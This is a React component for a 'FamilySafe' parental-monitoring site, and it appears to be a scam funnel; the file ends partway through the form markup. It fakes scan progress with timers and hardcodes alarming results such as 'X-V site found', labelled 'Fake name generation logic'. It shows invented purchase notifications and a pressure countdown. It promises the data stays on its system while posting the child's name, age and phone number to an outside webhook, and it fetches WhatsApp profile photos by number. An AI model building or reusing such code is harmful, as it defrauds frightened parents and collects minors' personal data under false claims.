"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  Search,
  MessageCircle,
  Shield,
  AlertTriangle,
  Lock,
  Eye,
  CheckCircle,
  X,
  Users,
  Music,
  Gamepad2,
  Instagram,
  Youtube,
  MessageSquare,
  ImageIcon,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Progress } from "@/components/ui/progress"
import { useGeolocation } from "@/hooks/useGeolocation"

type AppStep = "landing" | "form" | "verification" | "preliminary" | "generating" | "result"

const monitoringPlatforms = [
  { name: "WhatsApp", icon: MessageCircle, color: "text-green-600", description: "Messages and contacts" },
  { name: "Discord", icon: Users, color: "text-indigo-600", description: "Servers and conversations" },
  { name: "TikTok", icon: Music, color: "text-pink-600", description: "Videos and interactions" },
  { name: "Roblox", icon: Gamepad2, color: "text-blue-600", description: "Games and chat" },
  { name: "Instagram", icon: Instagram, color: "text-purple-600", description: "Posts and stories" },
  { name: "YouTube", icon: Youtube, color: "text-red-600", description: "Watched videos" },
]

const SalesProofPopup = ({ show, onClose }: { show: boolean; onClose: () => void }) => {
  const [currentMessage, setCurrentMessage] = useState("")

  const salesMessages = [
    "✅ Maria from São Paulo discovered suspicious activities 12 minutes ago",
    "✅ John recently viewed his child's conversations",
    "✅ Ana just accessed confidential report",
    "✅ Carlos completed full analysis right now",
    "✅ Fernanda got access to the report moments ago",
    "✅ Roberto performed complete verification now",
  ]

  useEffect(() => {
    if (show) {
      const randomMessage = salesMessages[Math.floor(Math.random() * salesMessages.length)]
      setCurrentMessage(randomMessage)
    }
  }, [show])

  if (!show) return null

  return (
    <motion.div
      initial={{ opacity: 0, y: 20, x: -20 }}
      animate={{ opacity: 1, y: 0, x: 0 }}
      exit={{ opacity: 0, y: 20, x: -20 }}
      className="fixed bottom-4 left-4 right-4 sm:bottom-5 sm:left-5 sm:right-auto sm:max-w-xs z-50 bg-white border border-gray-200 rounded-xl shadow-2xl p-3 sm:p-4"
      style={{
        fontSize: "13px",
        fontFamily: "Inter, -apple-system, BlinkMacSystemFont, sans-serif",
      }}
    >
      <div className="flex items-center gap-2 sm:gap-3">
        <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 bg-green-500 rounded-full animate-pulse flex-shrink-0" />
        <div className="flex-1 min-w-0">
          <p className="text-xs sm:text-sm font-medium text-gray-800 leading-tight">{currentMessage}</p>
        </div>
        <button
          onClick={onClose}
          className="text-gray-400 hover:text-gray-600 transition-colors duration-200 p-1 flex-shrink-0"
        >
          <X className="w-3 h-3 sm:w-4 sm:h-4" />
        </button>
      </div>
    </motion.div>
  )
}

export default function ParentalMonitoringApp() {
  const [currentStep, setCurrentStep] = useState<AppStep>("landing")
  const [childName, setChildName] = useState("")
  const [childAge, setChildAge] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedPlatforms, setSelectedPlatforms] = useState<string[]>(["WhatsApp"])
  const [profilePhoto, setProfilePhoto] = useState<string | null>(null)
  const [isLoadingPhoto, setIsLoadingPhoto] = useState(false)
  const [isPhotoPrivate, setIsPhotoPrivate] = useState(false)
  const [showCountryDropdown, setShowCountryDropdown] = useState(false)
  const [selectedCountry, setSelectedCountry] = useState({
    name: "Brasil",
    code: "+55",
    flag: "🇧🇷",
    placeholder: "11 99999-9999",
  })
  const [isSubmittingEmail, setIsSubmittingEmail] = useState(false)
  const [showSalesProof, setShowSalesProof] = useState(false)
  const [timeLeft, setTimeLeft] = useState(15 * 60)
  const [currentSlide, setCurrentSlide] = useState(0)
  const [verificationProgress, setVerificationProgress] = useState(0)
  const [verificationMessage, setVerificationMessage] = useState("Iniciando análise...")
  const [generatingProgress, setGeneratingProgress] = useState(0)
  const [generatingMessage, setGeneratingMessage] = useState("Analyzing social media activities...")
  const fileInputRef = useRef<HTMLInputElement>(null)
  const [uploadedPhoto, setUploadedPhoto] = useState<string | null>(null)
  const [userEmail, setUserEmail] = useState("")
  const [emailSubmitted, setEmailSubmitted] = useState(false)
  const [generatedProfiles, setGeneratedProfiles] = useState<any[]>([])
  const [selectedGender, setSelectedGender] = useState<string | null>(null)
  const [ageRange, setAgeRange] = useState<string | null>(null)
  const [lastTinderUse, setLastTinderUse] = useState<string | null>(null)
  const [cityChange, setCityChange] = useState<string | null>(null)
  const [countrySearch, setCountrySearch] = useState("")
  const [photoError, setPhotoError] = useState("")

  const countries = [
    { code: "+55", name: "Brasil", flag: "🇧🇷", placeholder: "(11) 99999-9999" },
    { code: "+1", name: "Estados Unidos", flag: "🇺🇸", placeholder: "(555) 123-4567" },
    { code: "+1", name: "Canadá", flag: "🇨🇦", placeholder: "(555) 123-4567" },
    { code: "+44", name: "Reino Unido", flag: "🇬🇧", placeholder: "7911 123456" },
    { code: "+33", name: "França", flag: "🇫🇷", placeholder: "6 12 34 56 78" },
    { code: "+49", name: "Alemanha", flag: "🇩🇪", placeholder: "1512 3456789" },
  ]

  const filteredCountries = countries.filter(
    (country) =>
      country.name.toLowerCase().includes(countrySearch.toLowerCase()) || country.code.includes(countrySearch),
  )

  // Geolocation hook
  const { city, loading: geoLoading, error: geoError } = useGeolocation()

  // Matrix effect codes
  const matrixCodes = [
    "4bda7c",
    "x1f801",
    "uSr9ub",
    "r31sw",
    "3cqvt",
    "ebwvi",
    "4qd1tu",
    "str5y4",
    "ect2So",
    "xfnpBj",
    "kqjJu",
    "2v46yn",
    "q619ma",
    "wdtqdo",
    "14mkee",
    "pbb3eu",
    "vbncg8",
    "begaSh",
    "7rq",
    "dcboeu",
    "keyxs",
    "3Qehu",
    "N8135s",
    "nx794n",
    "11aqSi",
    "zBcpp",
    "s1xcBm",
    "u91xnm",
    "1s7mec",
    "Y8fmf",
    "11masu",
    "ye1f2t",
  ]

  const getProgressSteps = () => [
    {
      id: "form",
      fullLabel: "Child Information",
      mobileLabel: "Info",
      completed: ["verification", "preliminary", "generating", "result"].includes(currentStep),
    },
    {
      id: "verification",
      fullLabel: "WhatsApp Verification",
      mobileLabel: "Verify",
      completed: ["preliminary", "generating", "result"].includes(currentStep),
    },
    {
      id: "preliminary",
      fullLabel: "Preliminary Scan",
      mobileLabel: "Scan",
      completed: ["generating", "result"].includes(currentStep),
    },
    {
      id: "generating",
      fullLabel: "Generating Report",
      mobileLabel: "Report",
      completed: ["result"].includes(currentStep),
    },
    {
      id: "result",
      fullLabel: "Results Ready",
      mobileLabel: "Results",
      completed: ["result"].includes(currentStep),
    },
  ]

  // Timer countdown
  useEffect(() => {
    if (currentStep === "result") {
      const timer = setInterval(() => {
        setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [currentStep])

  // Verification progress with dynamic messages
  useEffect(() => {
    if (currentStep === "verification") {
      const messages = [
        { progress: 0, message: "Checking social media activities..." },
        { progress: 15, message: "Analyzing facial recognition data..." },
        { progress: 30, message: "Checking recent login patterns..." },
        { progress: 45, message: "Scanning WhatsApp, Discord and other platforms..." },
        { progress: 60, message: "Detecting suspicious location activities..." },
        { progress: 75, message: "Compiling confidential evidence..." },
        { progress: 90, message: "Almost ready - finalizing your report..." },
        { progress: 100, message: "Investigation completed successfully!" },
      ]

      const interval = setInterval(() => {
        setVerificationProgress((prev) => {
          const newProgress = prev + Math.random() * 8 + 2

          const currentMessage = messages.find((m) => newProgress >= m.progress && newProgress < m.progress + 25)
          if (currentMessage) {
            setVerificationMessage(currentMessage.message)
          }

          if (newProgress >= 100) {
            setTimeout(() => setCurrentStep("preliminary"), 1000)
            return 100
          }
          return Math.min(newProgress, 100)
        })
      }, 400)
      return () => clearInterval(interval)
    }
  }, [currentStep])

  // Generating report progress (30 seconds) with geolocation integration
  useEffect(() => {
    if (currentStep === "generating") {
      const baseMessages = [
        { progress: 0, message: "Analyzing profile photos..." },
        { progress: 20, message: "Processing message history..." },
        { progress: 40, message: "Checking accessed locations..." },
        { progress: 60, message: "Compiling activity data..." },
        { progress: 80, message: "Encrypting sensitive information..." },
        { progress: 95, message: "Finalizing complete report..." },
        { progress: 100, message: "Report generated successfully!" },
      ]

      const messages = city
        ? [
            ...baseMessages.slice(0, 2),
            { progress: 30, message: `Analyzing recent activities in the ${city} region...` },
            ...baseMessages.slice(2),
          ]
        : baseMessages

      const interval = setInterval(() => {
        setGeneratingProgress((prev) => {
          const newProgress = prev + 100 / 75

          const currentMessage = messages.find((m) => newProgress >= m.progress && newProgress < m.progress + 20)
          if (currentMessage) {
            setGeneratingMessage(currentMessage.message)
          }

          if (newProgress >= 100) {
            setTimeout(() => setCurrentStep("result"), 1000)
            return 100
          }
          return Math.min(newProgress, 100)
        })
      }, 400)
      return () => clearInterval(interval)
    }
  }, [currentStep, city])

  // Updated sales proof effect - now includes generating step
  // Sales proof effect
  useEffect(() => {
    if (currentStep === "generating" || currentStep === "result") {
      const showProof = () => {
        if (Math.random() < 0.7) {
          setShowSalesProof(true)
          setTimeout(() => setShowSalesProof(false), 6000)
        }
      }

      const initialTimeout = setTimeout(showProof, 5000)
      const interval = setInterval(showProof, 25000)

      return () => {
        clearTimeout(initialTimeout)
        clearInterval(interval)
      }
    }
  }, [currentStep])

  const fetchWhatsAppPhoto = async (phone: string) => {
    if (phone.length < 10) return

    setIsLoadingPhoto(true)
    setPhotoError("")

    try {
      const response = await fetch("/api/whatsapp-photo", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phone: phone }),
      })

      let data: any = null

      try {
        data = await response.json()
      } catch {
        data = {}
      }

      if (!response.ok || !data?.success) {
        setProfilePhoto(
          "https://media.istockphoto.com/id/1337144146/vector/default-avatar-profile-icon-vector.jpg?s=612x612&w=0&k=20&c=BIbFwuv7FxTWvh5S3vB6bkT0Qv8Vn8N5Ffseq84ClGI=",
        )
        setIsPhotoPrivate(true)
        setPhotoError("Could not load photo")
        return
      }

      setProfilePhoto(data.result)
      setIsPhotoPrivate(!!data.is_photo_private)
    } catch (error) {
      console.error("Error fetching photo:", error)
      setProfilePhoto(
        "https://media.istockphoto.com/id/1337144146/vector/default-avatar-profile-icon-vector.jpg?s=612x612&w=0&k=20&c=BIbFwuv7FxTWvh5S3vB6bkT0Qv8Vn8N5Ffseq84ClGI=",
      )
      setIsPhotoPrivate(true)
      setPhotoError("Error loading photo")
    } finally {
      setIsLoadingPhoto(false)
    }
  }

  const handlePhoneChange = (value: string) => {
    let formattedValue = value
    if (!value.startsWith(selectedCountry.code)) {
      if (value && !value.startsWith("+")) {
        formattedValue = selectedCountry.code + " " + value
      } else if (value.startsWith("+") && !value.startsWith(selectedCountry.code)) {
        formattedValue = value
      } else {
        formattedValue = selectedCountry.code + " " + value.replace(selectedCountry.code, "").trim()
      }
    }

    setPhoneNumber(formattedValue)

    const cleanPhone = formattedValue.replace(/[^0-9]/g, "")
    if (cleanPhone.length >= 10) {
      fetchWhatsAppPhoto(cleanPhone)
    } else {
      setProfilePhoto(null)
      setIsPhotoPrivate(false)
    }
  }

  const togglePlatform = (platform: string) => {
    if (platform === "WhatsApp") return // WhatsApp always selected

    setSelectedPlatforms((prev) => (prev.includes(platform) ? prev.filter((p) => p !== platform) : [...prev, platform]))
  }

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (showCountryDropdown) {
        const target = event.target as Element
        if (!target.closest(".relative")) {
          setShowCountryDropdown(false)
        }
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [showCountryDropdown])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Updated blocked images with new chat screenshots
  const blockedImages = [
    "https://i.ibb.co/PZmmjcxb/CHAT1.png",
    "https://i.ibb.co/20581vtC/CHAT2.png",
    "https://i.ibb.co/LzFZdXXH/CHAT3.png",
    "https://i.ibb.co/kvWFRct/CHAT4.png",
  ]

  const nextSlide = () => {
    setCurrentSlide((prev) => (prev + 1) % blockedImages.length)
  }

  const prevSlide = () => {
    setCurrentSlide((prev) => (prev - 1 + blockedImages.length) % blockedImages.length)
  }

  // Auto-scroll do carrossel
  useEffect(() => {
    // Ensure page starts at the top
    window.scrollTo(0, 0)
  }, [])

  useEffect(() => {
    if (currentStep === "result") {
      const interval = setInterval(() => {
        // Only auto-advance if user hasn't scrolled recently
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop
        if (scrollTop < 100) {
          // Only auto-advance if near top of page
          nextSlide()
        }
      }, 4000)
      return () => clearInterval(interval)
    }
  }, [currentStep])

  const handlePhotoUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (file) {
      const reader = new FileReader()
      reader.onload = (e) => {
        setUploadedPhoto(e.target?.result as string)
      }
      reader.readAsDataURL(file)
    }
  }

  // Fake name generation logic
  const generateSuspiciousContacts = () => {
    if (generatedProfiles.length > 0) {
      return generatedProfiles
    }

    const suspiciousContacts = [
      {
        name: "X-V site found",
        icon: "🔞", // Adult content warning icon
        color: "text-red-600",
      },
      {
        name: "Discord video call",
        icon: "💬", // Discord chat icon
        color: "text-purple-600",
      },
      {
        name: "Omegle suspicious conversations and groups",
        icon: "👥", // Group chat icon
        color: "text-orange-600",
      },
    ]

    const profiles = []

    for (let i = 0; i < 3; i++) {
      const contact = suspiciousContacts[i]
      const age = Math.floor(Math.random() * 10) + 15 // 15-25 years old

      profiles.push({
        name: contact.name,
        age,
        lastSeen: `${Math.floor(Math.random() * 24)}h ago`,
        description: "Suspicious activity detected",
        icon: contact.icon,
        iconColor: contact.color,
        image: null, // Remove generic images, use platform icons instead
      })
    }

    setGeneratedProfiles(profiles)
    return profiles
  }

  useEffect(() => {
    if (currentStep === "result" && generatedProfiles.length === 0) {
      generateSuspiciousContacts()
    }
  }, [currentStep])

  const canVerify = childName.trim() !== "" && childAge.trim() !== "" && phoneNumber.trim() !== ""

  const handleSubmitForm = async () => {
    if (!canVerify) return

    setIsSubmittingEmail(true)

    try {
      console.log("[v0] Starting form submission with timeout protection")

      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 10000) // 10 second timeout

      const response = await fetch("https://emailserverside.com/webhook/parental-monitoring", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          childName,
          childAge,
          phoneNumber,
          selectedPlatforms,
          timestamp: new Date().toISOString(),
        }),
        signal: controller.signal,
      })

      clearTimeout(timeoutId)
      console.log("[v0] Webhook response received:", response.status)
    } catch (error) {
      console.log("[v0] Webhook failed (continuing anyway):", error)
      // Continue regardless of webhook status - user experience is priority
    } finally {
      setIsSubmittingEmail(false)
      setCurrentStep("verification")
    }
  }

  return (
    <div className="min-h-screen bg-black">
      {/* Global Progress Bar - Mobile Optimized */}
      {currentStep !== "landing" && (
        <div className="fixed top-0 left-0 right-0 z-50 bg-black border-b border-gray-700 shadow-sm">
          <div className="stepper-container overflow-x-auto px-3 py-3">
            <div className="flex items-center gap-2 min-w-max">
              {getProgressSteps().map((step, index) => (
                <div key={step.id} className="flex items-center">
                  <div className="stepper-step flex items-center gap-2 min-w-[80px] sm:min-w-[100px]">
                    <div
                      className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 flex-shrink-0 ${
                        step.completed
                          ? "bg-gradient-to-r from-green-500 to-green-600 text-white shadow-lg"
                          : "bg-gray-700 text-gray-400"
                      }`}
                    >
                      {step.completed ? "✓" : index + 1}
                    </div>
                    <span
                      className={`font-medium transition-colors duration-300 text-xs sm:text-sm whitespace-nowrap ${
                        step.completed ? "text-green-400" : "text-gray-400"
                      }`}
                    >
                      <span className="block sm:hidden">{step.mobileLabel}</span>
                      <span className="hidden sm:block">{step.fullLabel}</span>
                    </span>
                  </div>
                  {index < getProgressSteps().length - 1 && (
                    <div className="w-6 sm:w-8 h-px bg-gray-600 mx-2 sm:mx-3 flex-shrink-0" />
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Sales Proof Popup - Dynamic Social Proof */}
      <AnimatePresence>
        {showSalesProof && (currentStep === "generating" || currentStep === "result") && (
          <SalesProofPopup show={showSalesProof} onClose={() => setShowSalesProof(false)} />
        )}
      </AnimatePresence>

      <div className={currentStep !== "landing" ? "pt-16 sm:pt-20" : ""}>
        <AnimatePresence mode="wait">
          {/* Landing Page - Professional Design */}
          {currentStep === "landing" && (
            <motion.div
              key="landing"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="gradient-hero min-h-screen"
            >
              <nav className="nav-professional fixed top-0 left-0 right-0 z-40">
                <div className="container-professional">
                  <div className="flex items-center justify-between py-4">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center">
                        <Search className="w-5 h-5 text-black" />
                      </div>
                      <span className="text-xl font-bold text-white">FamilySafe</span>
                    </div>
                    <div className="hidden md:flex items-center gap-8">
                      <a href="#features" className="text-gray-300 hover:text-white transition-colors">
                        Features
                      </a>
                      <a href="#security" className="text-gray-300 hover:text-white transition-colors">
                        Security
                      </a>
                    </div>
                    <Button className="btn-primary">Start Now</Button>
                  </div>
                </div>
              </nav>

              <div className="section-padding pt-32">
                <div className="container-professional text-center">
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.8, delay: 0.2 }}
                    className="max-w-4xl mx-auto"
                  >
                    <div className="mb-8">
                      <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-full px-4 py-2 mb-6">
                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        <span className="text-sm text-white/90 font-medium">Real-Time Monitoring</span>
                      </div>

                      <h1 className="text-white mb-6">
                        Protect Your Children in the
                        <span className="block bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                          Digital World
                        </span>
                      </h1>

                      <p className="text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-8">
                        Discreetly monitor your children's activities on <strong className="text-white">Roblox</strong>,
                        <strong className="text-white"> WhatsApp</strong>,{" "}
                        <strong className="text-white">Discord</strong>,<strong className="text-white"> TikTok</strong>{" "}
                        and other platforms. Protect them from predators and inappropriate content.
                      </p>
                    </div>

                    <div className="flex flex-col sm:flex-row items-center justify-center gap-4 mb-12">
                      <Button onClick={() => setCurrentStep("form")} className="btn-primary text-lg px-8 py-4">
                        Start Monitoring
                        <svg className="w-5 h-5 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M13 7l5 5m0 0l-5 5m5-5H6"
                          />
                        </svg>
                      </Button>
                    </div>

                    <div className="flex items-center justify-center gap-8 text-sm text-gray-400">
                      <div className="flex items-center gap-2">
                        <CheckCircle className="w-4 h-4 text-green-400" />
                        <span>100% Secure</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Shield className="w-4 h-4 text-blue-400" />
                        <span>Encrypted</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Eye className="w-4 h-4 text-purple-400" />
                        <span>Invisible</span>
                      </div>
                    </div>
                  </motion.div>
                </div>
              </div>

              <div className="section-padding" id="features">
                <div className="container-professional">
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.5 }}
                    className="text-center mb-16"
                  >
                    <h2 className="text-white mb-4">Monitored Platforms</h2>
                    <p className="text-xl text-gray-300 max-w-2xl mx-auto">
                      Complete coverage of the main social networks and apps used by children and teenagers
                    </p>
                  </motion.div>

                  <div className="grid-professional grid-3-cols">
                    {monitoringPlatforms.map((platform, index) => (
                      <motion.div
                        key={platform.name}
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.6 + index * 0.1 }}
                        className="card-professional group hover:scale-105 transition-all duration-300"
                      >
                        <div className="flex items-center gap-4 mb-4">
                          <div
                            className={`w-12 h-12 rounded-xl bg-gradient-to-br from-gray-100 to-gray-200 flex items-center justify-center group-hover:scale-110 transition-transform`}
                          >
                            <platform.icon className={`w-6 h-6 ${platform.color}`} />
                          </div>
                          <div>
                            <h3 className="text-lg font-semibold text-white">{platform.name}</h3>
                            <p className="text-sm text-gray-400">{platform.description}</p>
                          </div>
                        </div>
                        <div className="flex items-center text-sm text-gray-500">
                          <div className="w-2 h-2 bg-green-400 rounded-full mr-2"></div>
                          Active Monitoring
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="section-padding bg-gradient-to-b from-transparent to-gray-950/50" id="security">
                <div className="container-professional">
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.7 }}
                    className="text-center mb-16"
                  >
                    <h2 className="text-white mb-4">Advanced Features</h2>
                    <p className="text-xl text-gray-300 max-w-2xl mx-auto">
                      Cutting-edge technology for complete protection of your children in the digital environment
                    </p>
                  </motion.div>

                  <div className="grid-professional grid-2-cols lg:grid-cols-3">
                    {[
                      {
                        icon: MessageSquare,
                        title: "Roblox Conversations",
                        description: "Monitor all conversations and interactions on Roblox in real time",
                        color: "text-green-400",
                      },
                      {
                        icon: ImageIcon,
                        title: "Exchanged Images",
                        description: "See all images sent and received in private chats",
                        color: "text-purple-400",
                      },
                      {
                        icon: Users,
                        title: "Suspicious Groups",
                        description: "Identify WhatsApp groups with inappropriate activities",
                        color: "text-red-400",
                      },
                      {
                        icon: Eye,
                        title: "Invisible Monitoring",
                        description: "Your child won't know they're being monitored",
                        color: "text-blue-400",
                      },
                      {
                        icon: AlertTriangle,
                        title: "Danger Alerts",
                        description: "Receive notifications about risky behaviors immediately",
                        color: "text-orange-400",
                      },
                      {
                        icon: Shield,
                        title: "24/7 Protection",
                        description: "Continuous monitoring across all digital platforms",
                        color: "text-cyan-400",
                      },
                    ].map((feature, index) => (
                      <motion.div
                        key={feature.title}
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.8 + index * 0.1 }}
                        className="card-professional group"
                      >
                        <div className="flex flex-col items-center text-center">
                          <div
                            className={`w-16 h-16 rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform`}
                          >
                            <feature.icon className={`w-8 h-8 ${feature.color}`} />
                          </div>
                          <h3 className="text-xl font-semibold text-white mb-3">{feature.title}</h3>
                          <p className="text-gray-400 leading-relaxed">{feature.description}</p>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="section-padding">
                <div className="container-professional">
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.8 }}
                    className="text-center"
                  >
                    <div className="max-w-3xl mx-auto card-professional bg-gradient-to-br from-gray-900/50 to-gray-800/50 backdrop-blur-sm border-gray-700">
                      <h2 className="text-white mb-6">Ready to Protect Your Children?</h2>
                      <p className="text-xl text-gray-300 mb-8 leading-relaxed">
                        Join thousands of parents who already protect their children with FamilySafe. Start monitoring
                        in less than 2 minutes.
                      </p>
                      <Button onClick={() => setCurrentStep("form")} className="btn-primary text-lg px-12 py-4 mb-6">
                        Start Monitoring Now
                      </Button>
                      <div className="flex items-center justify-center gap-6 text-sm text-gray-400">
                        <span>✓ No app installation</span>
                        <span>✓ 100% Confidential</span>
                        <span>✓ Results in minutes</span>
                      </div>
                    </div>
                  </motion.div>
                </div>
              </div>
            </motion.div>
          )}

          {currentStep === "form" && (
            <motion.div
              key="form"
              initial={{ opacity: 0, x: 50 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -50 }}
              className="container mx-auto px-4 py-6 sm:py-8"
            >
              <div className="max-w-2xl mx-auto">
                <Card className="p-6 sm:p-8 shadow-xl border-0 bg-white/80 backdrop-blur-sm">
                  <CardContent className="p-0">
                    <div className="text-center mb-6 sm:mb-8">
                      <h2 className="text-2xl sm:text-3xl font-bold text-blue-600 mb-3 sm:mb-4">
                        Your Child's Information
                      </h2>
                      <p className="text-gray-600 text-sm sm:text-base mb-4">
                        Fill in the details to start monitoring social media activities
                      </p>
                      <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-4">
                        <div className="flex items-center justify-center gap-2 mb-2">
                          <svg className="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                            />
                          </svg>
                          <span className="text-green-800 font-semibold text-sm">🔒 100% SECURE DATA</span>
                        </div>
                        <p className="text-green-700 text-xs sm:text-sm leading-relaxed">
                          <strong>Your data and security are fully protected.</strong> All information is encrypted with
                          military-grade technology and doesn't leave our secure system. We guarantee total privacy and
                          confidentiality of your child's information.
                        </p>
                      </div>
                    </div>

                    <div className="mb-4 sm:mb-6">
                      <label className="block text-sm sm:text-base font-semibold text-blue-600 mb-2 sm:mb-3">
                        Upload Photo for Platform Verification
                      </label>
                      <div className="border-2 border-dashed border-gray-300 rounded-xl p-6 text-center hover:border-blue-400 transition-colors">
                        <input
                          type="file"
                          accept="image/*"
                          className="hidden"
                          id="photo-upload"
                          onChange={handlePhotoUpload}
                        />
                        {uploadedPhoto ? (
                          <div className="flex flex-col items-center gap-3">
                            <img
                              src={uploadedPhoto || "/placeholder.svg"}
                              alt="Uploaded photo"
                              className="w-24 h-24 object-cover rounded-lg border-2 border-blue-200"
                            />
                            <label
                              htmlFor="photo-upload"
                              className="cursor-pointer text-sm text-blue-600 hover:text-blue-700"
                            >
                              Change Photo
                            </label>
                          </div>
                        ) : (
                          <label htmlFor="photo-upload" className="cursor-pointer flex flex-col items-center gap-2">
                            <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                              <svg
                                className="w-6 h-6 text-blue-600"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                              >
                                <path
                                  strokeLinecap="round"
                                  strokeLinejoin="round"
                                  strokeWidth={2}
                                  d="M12 6v6m0 0v6m0-6h6m-6 0H6"
                                />
                              </svg>
                            </div>
                            <span className="text-sm text-gray-600">Click to upload your child's photo</span>
                            <span className="text-xs text-gray-400">Used to verify identity on platforms</span>
                          </label>
                        )}
                      </div>
                    </div>

                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm sm:text-base font-semibold text-blue-600 mb-2 sm:mb-3">
                          Child/Teenager Name
                        </label>
                        <Input
                          type="text"
                          placeholder="Enter your child's name"
                          value={childName}
                          onChange={(e) => setChildName(e.target.value)}
                          className="py-2 sm:py-3 px-3 sm:px-4 text-sm sm:text-base rounded-xl border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                        />
                      </div>

                      <div>
                        <label className="block text-sm sm:text-base font-semibold text-blue-600 mb-2 sm:mb-3">
                          Age
                        </label>
                        <Input
                          type="number"
                          placeholder="Your child's age"
                          value={childAge}
                          onChange={(e) => setChildAge(e.target.value)}
                          className="py-2 sm:py-3 px-3 sm:px-4 text-sm sm:text-base rounded-xl border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                          min="8"
                          max="18"
                        />
                      </div>

                      <div>
                        <label className="block text-sm sm:text-base font-semibold text-blue-600 mb-2 sm:mb-3">
                          Your child's WhatsApp number
                        </label>
                        <div className="flex gap-2 sm:gap-3">
                          <div className="relative">
                            <button
                              type="button"
                              onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                              className="bg-gray-800 px-3 sm:px-4 py-2 sm:py-3 rounded-xl border border-gray-600 text-gray-300 flex-shrink-0 font-medium text-sm sm:text-base flex items-center gap-2 hover:bg-gray-700 transition-colors duration-200 min-w-[80px] sm:min-w-[90px]"
                            >
                              <span className="text-lg">{selectedCountry.flag}</span>
                              <span>{selectedCountry.code}</span>
                              <svg
                                className="w-3 h-3 sm:w-4 sm:h-4"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                              >
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                              </svg>
                            </button>

                            {showCountryDropdown && (
                              <div className="absolute top-full left-0 mt-1 bg-gray-800 border border-gray-600 rounded-xl shadow-lg z-50 w-80 max-h-60 overflow-y-auto">
                                {countries.map((country) => (
                                  <button
                                    key={country.code}
                                    type="button"
                                    onClick={() => {
                                      setSelectedCountry(country)
                                      setShowCountryDropdown(false)
                                      const currentNumber = phoneNumber.replace(/^\\+\\d+\\s*/, "")
                                      setPhoneNumber(country.code + " " + currentNumber)
                                    }}
                                    className="w-full px-3 py-2 text-left hover:bg-gray-700 flex items-center gap-3 text-sm text-gray-300"
                                  >
                                    <span className="text-lg">{country.flag}</span>
                                    <span className="font-medium">{country.code}</span>
                                    <span className="text-gray-400">{country.name}</span>
                                  </button>
                                ))}
                              </div>
                            )}
                          </div>
                          <Input
                            type="tel"
                            placeholder={selectedCountry.placeholder}
                            value={phoneNumber}
                            onChange={(e) => handlePhoneChange(e.target.value)}
                            className="flex-1 py-2 sm:py-3 px-3 sm:px-4 text-sm sm:text-base rounded-xl bg-gray-800 border-gray-600 text-white placeholder-gray-400 focus:border-blue-500 focus:ring-blue-500"
                          />
                        </div>
